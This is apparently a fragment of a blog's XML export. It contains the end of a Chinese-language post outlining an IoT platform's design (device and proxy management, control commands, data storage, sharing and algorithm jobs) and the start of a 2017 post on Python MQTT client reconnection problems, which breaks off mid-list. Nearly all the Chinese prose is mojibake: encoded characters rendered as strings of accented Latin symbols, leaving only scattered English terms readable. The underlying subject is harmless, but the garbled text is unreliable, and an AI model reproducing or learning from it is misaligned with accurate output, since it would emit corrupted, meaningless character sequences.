ËÆæÂ§áÁöÑÂü∫Êú¨‰ø°ÊÅØ, ÊØîÂ¶ÇÂêçÁß∞, ID, Êé•ÂÖ•ÊñπÂºè, Âú∞ÁêÜ‰ΩçÁΩÆ, ÂàõÂª∫Êó∂Èó¥ ËÆæÂ§áÊ†áÁ≠æ‰ø°ÊÅØ, ËøôÊòØÁÆÄÂçïÁöÑËµÑ‰∫ß, Áî®‰∫éÈÄöËøáÊ†áÁ≠æÂàÜÁ±ªËÆæÂ§á, ÁÆÄÂçïÁöÑËµÑ‰∫ßÂàÜÁ±ªÁÆ°ÁêÜ ËÆæÂ§áÈÄöÈÅì‰ø°ÊÅØ, Êï∞ÊçÆ‰∏äÊä•ÈÄöÈÅìÂíåËÆæÂ§áÊéßÂà∂ÈÄöÈÅìÁöÑÂêçÁß∞ Êé•ÂÖ•‰ø°ÊÅØ, Êé•ÂÖ•‰∫ëÁ´ØÁöÑÁî®Êà∑ÂêçÂíåÂØÜÁ†Å ËÆæÂ§áÁä∂ÊÄÅ‰ø°ÊÅØ, ËÆæÂ§áÊòØÂê¶‰∏ãÁ∫ø, ËÉΩÂê¶ÂíåËÆæÂ§áÈÄö‰ø° agentÁä∂ÊÄÅ‰ø°ÊÅØ, agentÊòØÂê¶ËøêË°å Â¶ÇÊûúÊòØÈÄöËøáproxyÊé•ÂÖ•, ÊòæÁ§∫proxyÂêçÁß∞ÂíåÁä∂ÊÄÅ‰ø°ÊÅØ ‰øÆÊîπËÆæÂ§á: Êèê‰æõËÆæÂ§áÂü∫Êú¨‰ø°ÊÅØÁöÑ‰øÆÊîπ: ËÆæÂ§áÂêçÁß∞, Êé•ÂÖ•ÊñπÂºè, Âú∞ÁêÜ‰ΩçÁΩÆ, ‰ª•ÂèäÂÖ∂‰ªñÁî®Êà∑Ëá™ÂÆö‰πâÂ±ûÊÄßÁöÑ‰øÆÊîπ Á¶ÅÁî®ËÆæÂ§á: Á¶ÅÁî®ËÆæÂ§áÂêé, Â∞ÜÁ¶ÅÊ≠¢ËÆæÂ§á‰∏é‰∫ëÁ´ØÂª∫Á´ãËøûÊé•: Â¶ÇÊûúÊòØagentÊé•ÂÖ•, ÂâîÈô§ËØ•agentÁöÑÂõûËØù, Âπ∂Á¶ÅÊ≠¢ËØ•ËÆæÂ§á ‰∏é‰∫ëÁ´ØÂª∫Á´ãËøûÊé• Â¶ÇÊûúÊòØproxyÊé•ÂÖ•, ÈÄöÁü•proxy, ÂÅúÊ≠¢‰∏∫ËØ•ËÆæÂ§áÂª∫Á´ã‰∏é‰∫ëÁ´ØÁöÑËøûÊé• ÂêØÁî®ËÆæÂ§á: ÂêØÁî®ËÆæÂ§áÂêé, ÊÅ¢Â§çÂÖÅËÆ∏ËÆæÂ§á‰∏é‰∫ëÁ´ØÂª∫Á´ãËøûÊé•: Â¶ÇÊûúÊòØagentÊé•ÂÖ•, Êí§ÈîÄËÆæÂ§áÁ¶ÅÊ≠¢Êé•ÂÖ•‰∫ëÁ´ØÁöÑÊéßÂà∂ Â¶ÇÊûúÊòØproxyÊé•ÂÖ•, ÈÄöÁü•proxy, ÈáçÊñ∞‰∏∫ËØ•ËÆæÂ§áÂª∫Á´ã‰∏é‰∫ëÁ´ØÁöÑËøûÊé• Âà†Èô§ËÆæÂ§á: Âà†Èô§ËÆæÂ§áÂêé, ‰∏éËÆæÂ§áÁõ∏ÂÖ≥ÁöÑÊâÄÊúâËøûÊé•ÈÉΩÂ∞ÜÊñ≠ÂºÄ, ËØ•ËÆæÂ§á‰ªéÊ≠§‰ª•ÂêéÂ∞ÜÊó†Ê≥ï‰∏é‰∫ëÁ´ØÂª∫Á´ãËøûÊé• ÂèñÊ∂àËØ•ËÆæÂ§áÈÄöÈÅìÁöÑÊâÄÊúâÂ§ÑÁêÜ Ê∏ÖÈô§Êé•ÂÖ•Áî®Êà∑‰ø°ÊÅØ, Áî®Êà∑Êó†Ê≥ïÂíå‰∫ëÁ´ØÂª∫Á´ãËøûÊé• Â¶ÇÊûúÊòØproxyÊé•ÂÖ•, ÈÄöÁü•‰ª£ÁêÜ ËØ•ËÆæÂ§áÂ∑≤ÁªèÂà†Èô§, Êõ¥Êñ∞‰ª£ÁêÜÂàóË°®, ÂÅúÊ≠¢‰∏∫ËØ•ËÆæÂ§á‰ª£ÁêÜ Ê∏ÖÈô§ËÆæÂ§áÁõ∏ÂÖ≥ÂÖÉÊï∞ÊçÆ ËÆæÂ§áÈÖçÈ¢ùÁÆ°ÁêÜ: ÈôêÂà∂Áî®Êà∑ÂèØ‰ª•ÂàõÂª∫ÁöÑËÆæÂ§áÊï∞Èáè Êü•ËØ¢ÈÖçÁΩÆ: ‰øÆÊîπÈÖçÈ¢ù: Áî±ÁÆ°ÁêÜÂëò‰øÆÊîπÈÖçÈ¢ù ËÆæÂ§áÊ†áÁ≠æÁÆ°ÁêÜ: Âü∫‰∫éÊ†áÁ≠æÁöÑËµÑ‰∫ßÁÆ°ÁêÜ Ê†áÁ≠æÁöÑÂàõÂª∫,Êü•Áúã,‰øÆÊîπ,Âà†Èô§ ‰∏∫ËÆæÂ§áÊ∑ªÂä†Ê†áÁ≠æ ÁßªÈô§ËÆæÂ§áÁöÑÊ†áÁ≠æ ËÆæÂ§áÁä∂ÊÄÅÂΩ±Â≠ê: Êü•ÁúãËÆæÂ§áÊúÄÊñ∞Áä∂ÊÄÅ, ËÆæÂ§áÊï∞ÊçÆÊé•ÂÖ•‰∫ëÁ´ØÊó∂ÈúÄË¶ÅÈÄöËøá ËÆæÂ§áÁ±ªÂûã Ê£ÄÊü•ËÆæÂ§áÁöÑ‰∏äÊä•ÁöÑÊï∞ÊçÆÊòØÂê¶ÂêàÊ≥ï, Âπ∂‰∏îÁªèÊúÄÊñ∞Áä∂ÊÄÅ ÂΩïÂÖ•, Áî®Êà∑ÂèØ‰ª•ÁúãÂà∞ËØ•ËÆæÂ§áÁöÑ ÊúÄÊñ∞Áä∂ÊÄÅÊï∞ÊçÆ. ËÆæÂ§áÁöÑÂèçÂêëÊéßÂà∂: ÊéßÂà∂Êåá‰ª§Êü•ÁúãÊéßÂà∂Êåá‰ª§Áî±agentÁöÑÊéßÂà∂Âô®ÂÆûÁé∞, Âú®agentÂêØÂä®Êó∂‰∏äÊä•Áªô‰∫ëÁ´Ø: ÊéßÂà∂Êåá‰ª§ÁöÑÂü∫Êú¨‰ø°ÊÅØ: ÊéßÂà∂Êåá‰ª§ÁöÑÂêçÁß∞, ÂäüËÉΩËØ¥Êòé, ‰ΩøÁî®ÊñπÂºè, È¢ÑÊúüÁªìÊûú, ÂºÇÂ∏∏ËØ¥Êòé„ÄÇ ÊéßÂà∂Êåá‰ª§ÁöÑ‰∏äÊä•Êó∂Èó¥, ÊâßË°åÊùÉ‰ΩøÁî®ËÄÖÂàóË°® ÊéßÂà∂Êåá‰ª§ÁöÑÊâßË°åËÆ∞ÂΩï ÊâßË°åÊùÉÂàÜÈÖçÂ∞ÜÊéßÂà∂Êåá‰ª§ÁöÑÊâßË°åÊùÉÂàÜÈÖçÁªôÊúâ‰∏™Áî®Êà∑, ËØ•Áî®Êà∑ÂèØ‰ª•ÊâßË°åËØ•ÊéßÂà∂Êåá‰ª§ ÊâßË°åÊùÉÂõûÊî∂Â∞ÜÊéßÂà∂Êåá‰ª§ÁöÑÊâßË°åÊùÉÂõûÊî∂„ÄÇÁî®Êà∑Â∞ÜÊ≤°ÊúâÊîπÊåá‰ª§ÁöÑÊâßË°åÊùÉ ÊâßË°åÊéßÂà∂Êåá‰ª§ÈªòËÆ§‰ªÖÊúâÁÆ°ÁêÜÂëòÂèØ‰ª•ÊâßË°åÊéßÂà∂Êåá‰ª§, ÊâßË°åÊéßÂà∂Êåá‰ª§, ÂæóÂà∞ÊâßË°åÁªìÊûú Á¶ÅÁî®ÊéßÂà∂Êåá‰ª§ Áî±ÁÆ°ÁêÜÂëòÂÜ≥ÂÆöÊòØÂê¶Á¶ÅÁî®ËØ•ÊéßÂà∂Êåá‰ª§ ÂêØÁî®ÊéßÂà∂Êåá‰ª§Áî±ÁÆ°ÁêÜÂëòÂÜ≥ÂÆöÊòØÂê¶ÂêØÁî®ËØ•ÊéßÂà∂Êåá‰ª§ proxyÁÆ°ÁêÜ: ÂàõÂª∫‰ª£ÁêÜ: ÂøÖÈ°ªÂèÇÊï∞: ‰ª£ÁêÜÂêçÁß∞, ÂèØÈÄâÂèÇÊï∞: Âú∞ÁêÜ‰ΩçÁΩÆ, ÂÖ∂‰ªñÂàõÂª∫Â±ûÊÄß Êü•Áúã‰ª£ÁêÜ: ÂêçÁß∞, Âú∞ÁêÜ‰ΩçÁΩÆ, ÂÖ∂‰ªñÂ±ûÊÄß, ÂàõÂª∫Êó∂Èó¥ ‰ª£ÁêÜÁä∂ÊÄÅ: Êú™Êé•ÂÖ•, ËøêË°å‰∏≠, Á¶ÅÁî® ‰ª£ÁêÜÁöÑ Êï∞Â≠óÁ≠æÂêçËØÅ‰π¶, CAËØÅ‰π¶, ‰ª£ÁêÜÁßÅÈí• ‰ª£ÁêÜËá™Â∑±‰ΩøÁî®ÁöÑÊéßÂà∂ÈÄöÈÅì(‰ª£ÁêÜÂíå‰∫ëÁ´ØÈÄö‰ø°ÁöÑÊé•Âè£), ÂíåÂºÇÂ∏∏‰∏äÊä•ÈÄöÈÅì ‰øÆÊîπ‰ª£ÁêÜ:ÂêçÁß∞, Âú∞ÁêÜ‰ΩçÁΩÆ, ÂÖ∂‰ªñÂ±ûÊÄß Âà†Èô§‰ª£ÁêÜ: Á°ÆËÆ§ËØ•‰ª£ÁêÜ‰∏ãÈù¢Ê≤°ÊúâËÆæÂ§áÂêéÊñπÂèØ‰ª•Âà†Èô§, ÁßªÈô§ÂêéÁöÑËÆæÂ§áÂ±û‰∫éÊó†‰∏äÊä•ÊñπÂºèÁöÑËÆæÂ§á, ÂêäÈîÄ‰ª£ÁêÜÁöÑËØÅ‰π¶ ÂâîÈô§‰ª£ÁêÜ ÁöÑ‰∏äÊä•ÂõûËØù(ÈùûÂ∏∏Âç±Èô©, Â¶ÇÊûú‰ª£ÁêÜÊ≠£Âú®‰∏äÊä•Êï∞ÊçÆ) Ê∏ÖÈô§‰ª£ÁêÜ‰ø°ÊÅØ Á¶ÅÁî®‰ª£ÁêÜ: Á¶ÅÊ≠¢ËØ•‰ª£ÁêÜÂèëÂ∏ÉÊï∞ÊçÆÂà∞‰∫ëÁ´Ø(ÁöÑÊï∞ÊçÆÁÆ°ÈÅì) ÂêØÁî®‰ª£ÁêÜ: Á¶ÅÊ≠¢ËØ•‰ª£ÁêÜÂèëÂ∏ÉÊï∞ÊçÆÂà∞‰∫ëÁ´Ø(ÁöÑÊï∞ÊçÆÁÆ°ÈÅì) Êü•Áúã‰ª£ÁêÜ‰∏ãÁöÑËÆæÂ§á: ÂàóÂá∫ËØ•‰ª£ÁêÜ‰∏ãÈù¢ÁöÑËÆæÂ§áÂàóË°® Ê∑ªÂä†ËÆæÂ§áÂà∞ËØ•‰ª£ÁêÜ‰∏ãÈù¢ ÁßªÈô§ËØ•‰ª£ÁêÜ‰∏ãÈù¢ÁöÑËÆæÂ§á device-gatewayÂêéÂè∞ÂäüËÉΩÊ¶ÇËø∞: Êï∞ÊçÆÂ≠òÂÇ®Ë¥üË¥£Â∞ÜÊï∞ÊçÆÂ≠òÂÇ®Âà∞ÂêéÁ´ØÂ≠òÂÇ® Áä∂ÊÄÅÊï∞ÊçÆÂ≠òÂÇ® ÁÉ≠Êï∞ÊçÆÂ≠òÂÇ® ÂéÜÂè≤Êï∞ÊçÆÂ≠òÂÇ® Êï∞ÊçÆÂèØËßÜÂåñ‰∏éËøêËê•(data-manager)‰∏ªË¶ÅË¥üË¥£Êï∞ÊçÆÁöÑÁÆ°ÁêÜÂíåÊü•Áúã, Êï∞ÊçÆ‰ª•Á±ªÂûãÁªÑÁªáÂú®‰∏ÄËµ∑, ‰ª•ÁÇπ‰Ωç‰∏∫Ê†∏ÂøÉ, Áî®Êà∑ÈÄöËøá‰∏∫Ëøô‰∫õ Êï∞ÊçÆÊ∑ªÂä†Ê†áÁ≠æ Êù•Ê∑ªÂä† Êï∞ÊçÆÁª¥Â∫¶, Êñπ‰æø‰∏öÂä°‰ΩøÁî®„ÄÇ Êï∞ÊçÆÂàÜÁ±ªÊèê‰æõÊï∞ÊçÆÁöÑÊü•Áúã‰∏éËøêËê•ÁÆ°ÁêÜ, Êï∞ÊçÆ‰ª•ÊåáÊ†áÁöÑÊñπÂºèÂ≠òÂÇ®, Áî®Êà∑ÈÄöËøáÊ†áÁ≠æÊù•ËøêËê•Êï∞ÊçÆ„ÄÇËøêËê•ÁöÑÊï∞ÊçÆ‰∏ªË¶ÅÁî±2Á±ªÊûÑÊàê: Áâ©ÁêÜÊåáÊ†áÊï∞ÊçÆ: ÈááÈõÜ‰∏äÊù•ÁöÑÂéüÂßãÊï∞ÊçÆ, ‰ª•ÁÇπ‰ΩçÁöÑÊúÄÂ∞èÈÄªËæëÂçïÂÖÉ‰∏∫ÊåáÊ†á,ÊØîÂ¶Ç ÈΩøËΩÆÁÆ±Á≠â„ÄÇ ÂàÜÊûêËøáÂêéÁöÑÊåáÊ†áÊï∞ÊçÆ: ÁªèËøáÂàÜÊûêËøáÂêéÁöÑÊï∞ÊçÆ ‰ª•ÁÆóÊ≥ï‰∏∫ÊåáÊ†á, ÂàÜÊûêÊ†πÊçÆÈúÄË¶Å‰∏∫Ëøô‰∫õÊï∞ÊçÆÊâìÁÆóÊ†áÁ≠æ„ÄÇ(ÊØîÂ¶ÇÊâìÁÆóËÆæÂ§áÊ†áÁ≠æ) Êï∞ÊçÆÊü•ÁúãÊèê‰æõÂØπÊï∞ÊçÆÁöÑÂü∫Êú¨Â±ïÁé∞ÁöÑÊîØÊåÅ, ‰ΩÜ‰∏çÊèê‰æõÂ§ßÈáèÂéüÂßãÊï∞ÊçÆÁöÑÂØºÂá∫ÂäüËÉΩ, Â§ßÈáèÂéüÂßãÊï∞ÊçÆÊòØÁïôÁªôËÆ°ÁÆóÂπ≥Âè∞‰ΩøÁî®ÁöÑ, Â¶ÇÈúÄÂØºÂá∫ËØ∑‰ΩøÁî®ÂØºÂá∫Â∑•ÂÖ∑ËøõË°åÂØºÂá∫„ÄÇ Êï∞ÊçÆÊü•ËØ¢ÈÖçÁΩÆÊü•Áúã:  ÂéÜÂè≤Êï∞ÊçÆÂàÜÂ±ÇÈÖçÁΩÆ: 1. ÊåâÊó∂Èó¥‰∏∫Áª¥Â∫¶ËøõË°åÂàíÂàÜ, ÈªòËÆ§‰∏∫3‰∏™Êúà 2. ÊåâÂÆπÈáèËøõË°åÂàíÂàÜ, ÈªòËÆ§‰∏∫ÊúÄËøë1wÊù°Êï∞ÊçÆ, ÈªòËÆ§ÊåâËßÑÂàô1ÊâßË°å„ÄÇ Áä∂ÊÄÅÊï∞ÊçÆÊü•ËØ¢ÂÆπÈáèÈôêÂà∂: ÈªòËÆ§‰∏∫1000Êù°Êï∞ÊçÆ, ÂèäËÆæÂ§áÁÇπ‰Ωç‰∏çÂæóÈªòËÆ§‰∏çÂæóË∂ÖËøá1000 ÂéÜÂè≤Êï∞ÊçÆÊü•ËØ¢ÂÆπÈáèÈôêÂà∂: ÈªòËÆ§‰∏∫100 * 100Êù°Êï∞ÊçÆ, ÂèäËÆæÂ§áÁÇπ‰Ωç‰∏çËÉΩË∂ÖËøá100‰∏™ÔºåÊØè‰∏™ÁÇπ‰ΩçÁöÑÊï∞ÊçÆ‰∏çÂæóË∂ÖËøá100Êù° Êï∞ÊçÆÊü•ËØ¢ÈÖçÁΩÆ‰øÆÊîπ: ‰øÆÊîπ‰ª•‰∏äÈÇ£‰∫õÈªòËÆ§ÈÖçÁΩÆ Êü•ËØ¢Êï∞ÊçÆ: Áä∂ÊÄÅÊü•ËØ¢: ‰πüÂ∞±ÊòØÂΩìÂâçÊé•ÂÖ•‰∫ã‰ª∂ÁöÑÊü•ËØ¢(Áî®‰∫éÊü•ÁúãÂΩì‰∏ãÊé•ÂÖ•ÁöÑÊï∞ÊçÆ, ‰∏çËÉΩÊü•ÁúãÂéÜÂè≤Êï∞ÊçÆ), Â¶ÇÊûúËÆæÂ§áÊé•ÂÖ•ÂºÇÂ∏∏ ËØ∑ÊòæÁ§∫Êé•ÂÖ•ÂºÇÂ∏∏‰ø°ÊÅØ, ‰ª•websocket ËøõË°åÂÆûÊó∂Êèê‰æõ ÂéÜÂè≤Êü•ËØ¢: ‰πüÂ∞±ÊòØË∂ãÂäøÊü•ËØ¢ ÁÉ≠Êï∞ÊçÆÊü•ËØ¢: Â¶ÇÊûúÊï∞ÊçÆÈáèËøáÂ§ßÔºåÈúÄË¶ÅÂàÜÁªÑËøõË°åËÅöÂêà ÂÜ∑Êï∞ÊçÆÊü•ËØ¢: Â¶ÇÊûúÊï∞ÊçÆÈáèËøáÂ§ßÔºåÈúÄË¶ÅÂàÜÁªÑËøõË°åËÅöÂêà Êï∞ÊçÆÊ†áÁ≠æÁÆ°ÁêÜ Êï∞ÊçÆÊ†áÁ≠æÊü•ËØ¢, ÈªòËÆ§Ê†áÁ≠æÂ±û‰∫éÁ≥ªÁªüÊ†áÁ≠æ(ÊØîÂ¶ÇÊï∞ÊçÆÂ±û‰∫éÈÇ£Âè∞ËÆæÂ§á, Êï∞ÊçÆÊòØÁî±ÈÇ£‰∏™ÈááÈõÜÂô®ÈááÈõÜ‰∏äÊù•ÁöÑ), Á¶ÅÊ≠¢‰øÆÊîπ, ‰∏∫Âè™ËØªÁä∂ÊÄÅ, ÂÖ∂‰ªñÊòØÁî®Êà∑‰∏∫Êï∞ÊçÆ ËøõË°åÁöÑËá™ÂÆö‰πâÊ†áÁ≠æ Ê∑ªÂä†Ê†áÁ≠æ: ‰∏∫Êï∞ÊçÆ Ê∑ªÂä†Ê†áÁ≠æÔºå Ê†áÁ≠æÊúâÈïøÂ∫¶ÈôêÂà∂(ÊúÄÈïø‰∏çÂæóË∂ÖËøá16‰∏™Â≠óÁ¨¶) Âà†Èô§Ê†áÁ≠æ: Âà†Èô§Ê†áÁ≠æ,‰ΩÜÊòØÂà†Èô§‰πãÂâç ÈúÄË¶ÅÁ°ÆËÆ§Êï∞ÊçÆÊòØÂê¶Â∑≤ÁªèÊéàÊùÉ, Â¶ÇÊûúÂ∑≤ÁªèÊéàÊùÉÂàÜ‰∫´, ÈúÄË¶ÅÊí§ÈîÄÂàÜ‰∫´ ÊâçËÉΩÂà†Èô§ Êï∞ÊçÆÊéàÊùÉ Áî®Êà∑ÊåâÁÖßËá™Â∑±ÁöÑÈúÄË¶Å Â∞ÜÊï∞ÊçÆÊâì‰∏äÊ†áÁ≠æ, ÊàñËÄÖ‰ΩøÁî®ÈªòËÆ§Ê†áÁ≠æ, Â∞ÜÂØπÂ∫îÁöÑÊï∞ÊçÆ ÂàÜÊûêÁªôÂÖ∂‰ªñÁî®Êà∑ËÆøÈóÆ. Êï∞ÊçÆÂàÜ‰∫´Êü•ËØ¢: Êü•ËØ¢ÈÇ£‰∫õÊï∞ÊçÆ,Ë¢´ÂàÜÊûêÁªô‰∫ÜÈÇ£‰∫õÁî®Êà∑ ÂàÜ‰∫´ÊùÉÈôêÊí§ÈîÄ: Êí§ÈîÄÂ∑≤ÁªèÂàÜÊûêÂá∫ÂéªÁöÑÊï∞ÊçÆÊéàÊùÉ Êï∞ÊçÆÂàÜ‰∫´: ÊåáÂÆöÊüê‰∫õÁî®Êà∑ÂèØ‰ª•ËÆøÈóÆÈÇ£‰∫õÊ†áÁ≠æÁöÑÊï∞ÊçÆ„ÄÇ Êï∞ÊçÆÂàÜÊûêÊï∞ÊçÆÂàÜÊûêÂõ¥ÁªïÁÆóÊ≥ïÂíå‰ªªÂä°ËøõË°åÂ±ïÂºÄ, ÂÖ≥ÈîÆÁöÑÂú®‰∫é ÁÆóÊ≥ïÁöÑÈ´òÂ∫¶ÂèØÂÆöÂà∂Âåñ, ÁÆóÊ≥ïÊµãËØï, ËøêË°åÊó∂Ê£ÄÊü•, ‰ª•ÂèäÁÆóÊ≥ïÊâßË°åËøáÁ®ã‰∏≠‰ªªÂä°ÁöÑÂèØËßÜÂåñ„ÄÇÂäüËÉΩÊòØÊª°Ë∂≥È´òÁ∫ßÁî®Êà∑ ÂØπ‰∫éÊï∞ÊçÆÂàÜÊûêÁöÑÈúÄÊ±Ç„ÄÇ ÈÄöËøáÁÆóÊ≥ïÂØπÊï∞ÊçÆËøõË°åÊ∑±Â∫¶ÂàÜÊûêÁöÑÂäüËÉΩ„ÄÇ ÂÆûÊó∂ËÆ°ÁÆó Á¶ªÁ∫øËÆ°ÁÆó(Êä•Ë°®ÁªüËÆ°ÂíåÊ∑±Â∫¶Â≠¶‰π†, Ê∑±Â∫¶ÈúÄË¶Å‰æùËµñÂ§ßÈáèÊï∞ÊçÆËÆ≠ÁªÉÂá∫Ê®°ÂûãÔºåÁÑ∂ÂêéÈÄöËøáÊ®°Âûã Â∫îÁî®Âà∞‰∫ã‰ª∂ÂàÜÊûê, ËææÂà∞Êô∫ËÉΩÂàÜÊûêÁöÑÁõÆÁöÑ) Ê∑∑ÂêàËÆ°ÁÆó: ÊØîÂ¶ÇÂÖà‰ΩøÁî®Á¶ªÁ∫øËÆ°ÁÆóËÆ≠ÁªÉÊ®°Âûã, ÁÑ∂ÂêéÂ∞ÜÊ®°Âûã Â∫îÁî®Âà∞ÂÆûÊó∂ËÆ°ÁÆó, ÊàñËÄÖ‰ΩøÁî®ÂÆûÊó∂ËÆ°ÁÆó‰Ωú‰∏∫ÊµãËØïÊï∞ÊçÆ,‰ª•ÂéÜÂè≤Êï∞ÊçÆ‰Ωú‰∏∫ËÆ≠ÁªÉÊï∞ÊçÆ ËøõË°å‰∫§ÂèâÈ™åËØÅ,‰ª•‰æøËÆ≠ÁªÉÂáÜÁ°ÆÁöÑÊ®°Âûã„ÄÇ ÁÆóÊ≥ïÁÆ°ÁÆ°ÁêÜÁÆóÊ≥ïÊñá‰ª∂, ÁÆóÊ≥ïÊñá‰ª∂Ë°®Áé∞‰∏∫‰∏Ä‰∏™ËÑöÊú¨Êñá‰ª∂, ÂØπ‰∫éstorm Âπ≥Âè∞ËÄåÂ∑≤, ÁÆóÊ≥ïÊñá‰ª∂ÊòØgrooveËÑöÊú¨, ÂØπ‰∫éspark Âπ≥Âè∞ËÄåË®Ä, ÁÆóÊ≥ïÊñá‰ª∂ ÂèØ‰ª•ÊòØsparkÊîØÊåÅÁöÑÂ§öÁßçËØ≠Ë®ÄÁöÑËÑöÊú¨„ÄÇ ‰∏ä‰º†ÁÆóÊ≥ï: ‰∏ä‰º†ËÑöÊú¨Êñá‰ª∂, ÁÆóÊ≥ïÂêçÁß∞(ÈªòËÆ§ÊòØÁÆóÊ≥ïÊñá‰ª∂ÁöÑÂêçÁß∞,ÂéªÊéâÂêéÁºÄ), ÁÆóÊ≥ïÊèèËø∞‰ø°ÊÅØ(ÂåÖÂê´ÁÆóÊ≥ïË¶ÅËß£ÂÜ≥ÁöÑÈóÆÈ¢ò, ËæìÂÖ•ÂèÇÊï∞ÁöÑËß£ÈáäÂíåËæìÂá∫ÂèÇÊï∞ÁöÑËß£Èáä), ÁÆóÊ≥ïËøêË°åÂπ≥Âè∞() ‰∏ãËΩΩÁÆóÊ≥ï: ‰∏ãËΩΩÁÆóÊ≥ïÊñá‰ª∂„ÄÇ Âà†Èô§ÁÆóÊ≥ï: Âà†Èô§ÁÆóÊ≥ïÊñá‰ª∂. Êõ¥Êñ∞ÁÆóÊ≥ïÂÖÉÊï∞ÊçÆ: Êõ¥Êñ∞ÁÆóÊ≥ïÁöÑÂêçÁß∞ ÊàñËÄÖÁÆóÊ≥ïÁöÑÊèèËø∞‰ø°ÊÅØ Êü•ÁúãÁÆóÊ≥ï: Êü•ÁúãÊâÄÊúâÁÆóÊ≥ï„ÄÇ ÁÆóÊ≥ïËÆøÈóÆÊéàÊùÉ: ÊéàÊùÉÁÆóÊ≥ïÁªôÊüê‰∏™Áî®Êà∑ËÆøÈóÆ„ÄÇ ÁÆóÊ≥ïÊéàÊùÉÊí§ÈîÄ: Êí§ÈîÄÊüê‰∏™Áî®Êà∑ËÆøÈóÆÊüê‰∏™ÁÆóÊ≥ïÁöÑÊùÉÈôê„ÄÇ ‰ªªÂä°ÊâßË°åÁÆóÊ≥ï ËøêË°åÊó∂‰∫ßÁîü‰∏Ä‰∏™ÁúüÊ≠£ÁöÑ‰ªªÂä°, Âõ†Ê≠§ËøêË°åÁÆóÊ≥ï ÈúÄË¶ÅÊúâ‰ª•‰∏ãËøô‰∫õÂèÇÊï∞: ÁÆóÊ≥ïÊñá‰ª∂, ÈÄöËøáÊåáÂÆöÁÆóÊ≥ïÊñá‰ª∂ÁöÑidÊù•ÂÆåÊàê ÁÆóÊ≥ïÁöÑËæìÂÖ•ÂíåËæìÂá∫: Êâ´ÊèèËé∑ÂèñÁÆóÊ≥ïÊñá‰ª∂ÁöÑ ËæìÂÖ•ÂíåËæìÂá∫ÂΩ¢ÂèÇ() ÈÄâÂÆöËæìÂÖ•Ê∫êÁöÑÂΩ¢ÂèÇÂØπÂ∫îÁöÑÊï∞ÊçÆ, ÈÄöËøáÂéªËæìÂÖ•Ê∫ê Êü•ÁúãÂæóÂá∫, ÈÄâÊã©ËæìÂá∫Ê∫ê ÂØπÂ∫îÁöÑÂêçÁß∞„ÄÇ(ÂèØ‰ª•Ê£ÄÊü•ËæìÂÖ•Ê∫êÊòØÂê¶ÊúâÊï∞ÊçÆ) ÊâßË°åÂπ≥Âè∞, Ê†πÊçÆÁÆóÊ≥ïÊñá‰ª∂id, ÂæóÁü•ËØ•ÁÆóÊ≥ïË∞ÉÂ∫¶Âà∞ÈÇ£‰∏™Âπ≥Âè∞‰∏äËøêË°å(jstrom, spark), Â¶ÇÊûúÊ≤°ÊúâÂØπÂ∫îÂπ≥Âè∞ÊîØÊåÅ, ÂàôÊä•Èîô Áé∞ÊúâÁâ©ËÅîÁΩëÂπ≥Âè∞ÂèÇËÄÉÂõΩÂÜÖÂ§ñÁâ©ËÅîÁΩëÂπ≥Âè∞Êû∂ÊûÑÂæÆËΩØAzure IoT‰∫öÈ©¨ÈÄäAWS IoTIBM Watson IOT]]></content>
      <categories>
        <category>ÂºÄÂèëËØ≠Ë®Ä</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>iot</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PythonÁöÑmqttÂÆ¢Êà∑Á´Ø‰ΩøÁî®ËØ¥Êòé]]></title>
    <url>%2F2017%2F07%2F04%2Fmqtt-reconnect%2F</url>
    <content type="text"><![CDATA[ÊúÄËøë‰ΩøÁî®PythonÂÜô‰∏Ä‰∏™ÂêéÂè∞ÊúçÂä°Â§ÑÁêÜmqttÈáåÈù¢ÁöÑ‰∫ã‰ª∂Êó∂ÈÅáÂà∞‰∫Ü‰∏Ä‰∏™È∫ªÁÉ¶: mqttËøûÊé•ÈáçÁΩÆÊó∂(ÈáçÂêØmqttÊúçÂä°Âêé), ‰πãÂâçpubÊ∂àÊÅØÁöÑÁ∫øÁ®ã‰∏çËÉΩÊ≠£Â∏∏Â∑•‰Ωú‰∫Ü, ÁªèËøáÂ§öÊ¨°Ë∏©Âùë, Áªà‰∫éËß£ÂÜ≥. ÂºïÂèëÈóÆÈ¢òÁöÑÂéüÂõ†ÊòØÊàë‰ΩøÁî®ÂßøÂäø‰∏çÂØπÈÄ†ÊàêÁöÑ, ‰∏ÄÊó¶‰Ω†‰ΩøÁî®ÂßøÂäø‰∏çÂØπ ‰ºöÈÄ†Êàê‰∏Ä‰∫õÂ•áÊÄ™ÁöÑÈóÆÈ¢ò,Âπ∂‰∏îÂæàÈöæËß£ÂÜ≥„ÄÇ Âõ†Ê≠§ËØ∑Ê≠£Á°Æ‰ΩøÁî®mqtt„ÄÇ Ê≥®ÊÑè‰∫ãÈ°πÂÖ≥‰∫éMQTTÂçèËÆÆÁöÑ‰ªãÁªçËØ∑ÂèÇËÄÉ‰πãÂâçÂçöÂÆ¢: Áâ©ËÅîÁΩë‰πãMQTT, Âè™ÊúâÂú®‰∫ÜËß£MQTTÂçèËÆÆËøáÂêé, Êàë‰ª¨ÊâçËÉΩ‰ª•Ê≠£Á°ÆÁöÑÂßøÂäø‰ΩøÁî®Â•π, ‰ª•‰∏ãÊòØÊàëËßâÂæóÈúÄË¶ÅÊ≥®ÊÑèÁöÑÂú∞Êñπ: ÊåâÈúÄ‰ΩøÁî®MQTTÁöÑQos, ÂΩìQos=2Êó∂ÂèØÈù†ÊÄßÊúÄÈ´ò, ‰ΩÜÊòØ‰ºöÊçüÂ§±ÊÄßËÉΩ„ÄÇ Â∞ΩÈáè‰ΩøÁî®client_idÊù•Ê†áÁ§∫ÂÆ¢Êà∑Á´Ø, ‰ΩÜÊòØÊ≥®ÊÑè Â¶ÇÊûú2‰∏™ÂÆ¢Êà∑Á´Ø‰ΩøÁî®Âêå‰∏Ä‰∏™client_id, ‰ºöÂá∫Áé∞client‰∫âÊä¢ËøûÊé•ÁöÑÁä∂ÊÄÅ, ÊâÄ‰ª•ÂÖ®Â±ÄÊåÅÊúâ‰∏Ä‰∏™clientÊòØ‰∏çÈîôÁöÑÈÄâÊã©„ÄÇ Ê≥®ÊÑèÂºÇÊ≠•Â§ÑÁêÜ, Âú®ÂõûË∞ÉÂáΩÊï∞‰∏≠‰∏çËÉΩÈòªÂ°û„ÄÇ Â∞ÜÊâÄÊúâÊï∞ÊçÆÂ§ÑÁêÜÈÄªËæëÊîæÂà∞ÂõûË∞ÉÂáΩÊï∞ÈáåÈù¢, 